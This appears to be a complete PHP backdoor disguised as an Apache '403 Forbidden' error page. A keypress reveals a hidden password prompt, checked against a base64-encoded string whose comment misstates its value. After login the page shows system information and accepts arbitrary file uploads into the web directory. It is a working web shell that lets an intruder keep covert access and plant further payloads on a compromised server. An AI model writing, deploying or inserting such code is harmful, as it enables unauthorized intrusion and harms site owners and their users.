<?php
session_start();

// Base64 encoded password
$encodedPassword = 'aW1nMHNwZWw='; // 'password' encoded in base64

// Check if the form has been submitted
if (isset($_POST['password'])) {
    $inputPassword = $_POST['password'];
    if (base64_encode($inputPassword) === $encodedPassword) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "Incorrect password!";
    }
}

// Determine if the user is authenticated
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'];

// Output the appropriate HTML
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Forbidden</title>
    <style>
        body 
        #passwordForm {
            display: none;
            margin-top: 20px;
        }
        #passwordInput {
            padding: 10px;
            font-size: 16px;
        }
        #submitBtn {
            padding: 10px 20px;
            font-size: 16px;
        }
        #error {
            color: red;
            margin-top: 10px;
        }
    </style>
    <script>
        document.addEventListener('keydown', function(event) {
            if (event.key === '9') {
                document.getElementById('passwordForm').style.display = 'block';
            }
        });
    </script>
</head>
<body>
    <h1>Forbidden</h1>
    <p>You don't have permission to access this resource.</p>
    
    <?php if ($authenticated): ?>
        <pre><?php echo htmlspecialchars(php_uname()); ?></pre>
        <br/><form method="post" enctype="multipart/form-data">
            <input type="file" name="__">
            <input name="_" type="submit" value="Upload">
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
                echo 'OK';
            } else {
                echo 'ER';
            }
        }
        ?>
    <?php else: ?>
        <div id="passwordForm">
            <form method="post">
                <input type="password" id="passwordInput" name="password" placeholder="Enter password" required>
                <button id="submitBtn" type="submit">Submit</button>
            </form>
            <?php if (isset($error)): ?>
                <p id="error"><?php echo htmlspecialchars($error); ?></p>
            <?php endif; ?>
        </div>
    <?php endif; ?>
    <hr>
    <address>Apache/2.4.59 (Debian) Server at just g0spel work here Port 80</address>
</body>
</html>
